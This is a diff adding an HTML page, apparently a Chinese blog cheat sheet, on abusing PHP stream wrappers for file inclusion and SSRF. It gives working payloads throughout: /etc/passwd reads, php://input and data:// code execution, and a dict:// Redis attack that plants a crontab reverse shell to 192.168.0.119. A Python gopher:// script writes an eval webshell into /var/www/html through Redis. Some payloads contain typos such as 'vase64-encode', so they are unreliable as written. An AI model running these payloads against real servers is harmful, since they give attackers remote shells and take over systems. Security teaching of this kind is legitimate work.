@@ -1,0 +1,54 @@
+<div class="article_content clearfix" id="article_content">
+<link href="style.css" rel="stylesheet"/>
+<div class="markdown_views prism-atom-one-dark" id="content_views">
+<svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
+<path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+</svg>
+<h1><a id="PHP_2"></a>PHP伪协议</h1>
+<ul><li> <h2><a id="file_3"></a>file://协议</h2> <p>用来读取本地的文件，当用于文件读取函数时可以用。</p> <p>常见检测是否存在漏洞写法：</p> <p>www.xxx.com/?file=<strong>file:///etc/passwd</strong></p> <p>此协议不受allow_url_fopen,allow_url_include配置影响</p> <br/> </li><li> <h2><a id="phpinput_15"></a>php://input协议</h2> <p>此协议一般用于输入getshell的代码。</p>
+<ul><li> <h3><a id="_19"></a>使用方法：</h3> <p>在get处填上php://input如下</p> <p><font color="red">www.xxx.xxx/?cmd=php://input </font></p> <p>然后用hackbar或者其他工具，postPHP代码进行检验，如</p> &lt;?php&gt;phpinfo()?&gt; </li></ul> <p>此协议受allow_url_include配置影响</p> <br/> </li><li> <h2><a id="phpfilter_33"></a>php://filter协议</h2> <p>此协议一般用来查看源码</p> <p>一般用法如下<br/> <font color="red"><br/> www.xxx.xxx/<strong>?file=php://filter/read=covert,vase64-encode/resource=index.php</strong><br/> </font><br/> 出来的是base64码需要进行解码</p> <p>此协议不受allow_url_fopen,allow_url_include配置影响</p> <br/> </li><li> <h2><a id="data_47"></a>data://协议</h2> <p>需要allow_url_fopen,allow_url_include均为on</p> <p>这是一个输入流执行的协议，它可以向服务器输入数据，而服务器也会执行。常用代码如下：<br/> <font color="red"><br/> http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;<br/> </font><br/> <em>text/plain，表示的是文本</em></p> <p><em>text/plain;base64, 若纯文本没用可用base64编码</em><br/> <br/></p> </li><li> <h2><a id="dict_61"></a>dict://协议</h2> <p>与gopher协议一般都出现在<strong>ssrf</strong>协议中，用来探测端口的指纹信息。同时也可以用它来代替gopher协议进行ssrf攻击。</p> <p>常见用法：</p>
+<ul><li> <h3><a id="_67"></a>探测端口指纹</h3> <p><strong>192.168.0.0/?url=dict://192.168.0.0:6379</strong></p> <p>以上为探测6379（redis）端口的开发</p> </li><li> <h3><a id="shell_73"></a>反弹shell</h3> <p>1、开启反弹shell的监听</p> <p><strong>nc -l 9999</strong></p> <p>2、依次执行下面的命令</p> <p><em><em>curl dict://192.168.0.119:6379/set:mars:"\n\n</em> * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.119/9999 0&gt;&amp;1\n\n"<br/> curl dict://192.168.0.119:6379/config:set:dir:/etc/<br/> curl dict://192.168.0.119:6379/config:set:dbfilename:crontab<br/> curl dict://192.168.0.119:6379/bgsave</em>*</p> <p>执行时，反弹shell的命令，也就是set:mars:xxx，会因为特殊字符的原因无法写入到目标的redis中，被被空格所分割导致出现一下情况：</p> <p>1<strong>584705879.520734 [0 172.17.0.1:44488] “set” “mars” “\n\n*” “<em>" "</em>” “<em>" "</em>” “root” “bash” “-i” “&gt;&amp;” “/dev/tcp/192.168.0.119/6789” "0&gt;&amp;1\n\n"</strong></p> <p>我们会发现，命令被分割了，看表象感觉像是被空格分割了。此时将反弹shell的命令进行十六进制转换，变为：</p> <p><strong>curl dict://192.168.0.119:6379/set:mars:"\x0a\x2a\x20\x2a\x20\x2a\x20\x2a\x20\x2a\x20\x72\x6f\x6f\x74\x20\x62\x61\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x31\x39\x32\x2e\x31\x36\x38\x2e\x30\x2e\x31\x31\x39\x2f\x39\x39\x39\x39\x20\x30\x3e\x26\x31\x0a"</strong></p> <p>以上单引号使用反斜杠\进行转移，其他数据进行十六进制编码，执行结果如下，可以发现没有错误了</p> <p><em><em>1584706087.980465 [0 172.17.0.1:44490] “set” “mars” "\n</em> * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.119/9999 0&gt;&amp;1\n"</em>*</p> <p>剩下的修改路径和文件名称的请求，正常执行即可</p> </li></ul> </li><li> <h2><a id="gopher_102"></a>gopher://协议</h2> <p>gopher://协议经常用来打内网的各种应用如<strong>mysql redis</strong>等。一般要用一些工具来进行构造payload 如gopherus等</p> <p>之前用来打redis内网的脚本如下</p> <pre><code class="prism language-python"><span class="token comment">#!/usr/bin/python</span>
+<span class="token comment"># -*- coding: UTF-8 -*-</span>
+<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request
+<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote
+
+url <span class="token operator">=</span> <span class="token string">"http://192.168.239.78:41403/index.php?url="</span>    <span class="token comment">#windows上搭建的ssrf漏洞页面</span>
+gopher <span class="token operator">=</span> <span class="token string">"gopher://0.0.0.0:6379/_"</span> <span class="token comment">#/var/www/html</span>
+<span class="token comment">#auth nonono</span>
+<span class="token comment"># 攻击脚本</span>
+data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
+flushall
+set test "\\n\\n&lt;?php @eval($_POST[x]);?&gt;\\n\\n"
+config set dir /var/www/html
+config set dbfilename shell.php
+save
+quit
+"""</span>
+<span class="token keyword">def</span> <span class="token function">encoder_url</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    encoder <span class="token operator">=</span> <span class="token string">""</span>
+    <span class="token keyword">for</span> single_char <span class="token keyword">in</span> data<span class="token punctuation">:</span>
+        <span class="token comment"># 先转为ASCII</span>
+        encoder <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>single_char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    encoder <span class="token operator">=</span> encoder<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span><span class="token string">"%"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"%a"</span><span class="token punctuation">,</span><span class="token string">"%0d%0a"</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> encoder
+
+<span class="token comment"># 二次编码</span>
+encoder <span class="token operator">=</span> encoder_url<span class="token punctuation">(</span>encoder_url<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>encoder<span class="token punctuation">)</span>
+<span class="token comment"># 生成payload</span>
+payload <span class="token operator">=</span> url <span class="token operator">+</span> quote<span class="token punctuation">(</span>gopher<span class="token punctuation">,</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token operator">+</span> encoder
+
+<span class="token comment"># 发起请求</span>
+request <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+response <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>
+
+</code></pre> <h5><a id="br_150"></a><br/></h5> </li><li> <h2><a id="zip_152"></a>zip://协议</h2> <p>zip://协议可以用来访问服务器中的压缩包，无论压缩包里面的文件是什么类型的都可以执行。也就是说如果服务器禁止我们上传php文件那么我们可以把php文件改后缀然后压缩再上传，然后用zip协议访问。要利用zip协议时一般要结合文件上传与文件包含两个漏洞</p> <p>一般的代码为<br/> <font color="red"><br/> <strong>www.xxx.xxx/?file=<strong>zip:///php.zip#phpinfo.jpg</strong></strong></font></p> <p>其中的#好表示的是php.zip的子文件名。有时候#需要变成==%23==，url编码。</p> <br/> </li><li> <h2><a id="compressbzip2_164"></a>compress.bzip2://协议</h2> <p>与zip协议类似不过要压缩成bzip2格式的</p> <br/> </li><li> <h2><a id="compresszlib_170"></a>compress.zlib://协议</h2> <p>与zip协议类似不过要压缩成zlib格式的</p> <br/> </li><li> <h2><a id="phar_176"></a>phar://协议</h2> <p>phar://协议与zip://协议类似，它也可以访问zip包，访问的格式与zip的不同，如下所示</p> <pre><code class="prism language-python">http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">/</span>include<span class="token punctuation">.</span>php?
+<span class="token builtin">file</span><span class="token operator">=</span>phar<span class="token punctuation">:</span><span class="token operator">//</span><span class="token operator">/</span>phpinfo<span class="token punctuation">.</span><span class="token builtin">zip</span><span class="token operator">/</span>phpinfo<span class="token punctuation">.</span>txt
+<span class="token comment">#这里用/隔开了子文件</span>
+</code></pre> </li></ul>
+</div>
+<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css" rel="stylesheet"/>
+<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css" rel="stylesheet"/>
+</div>
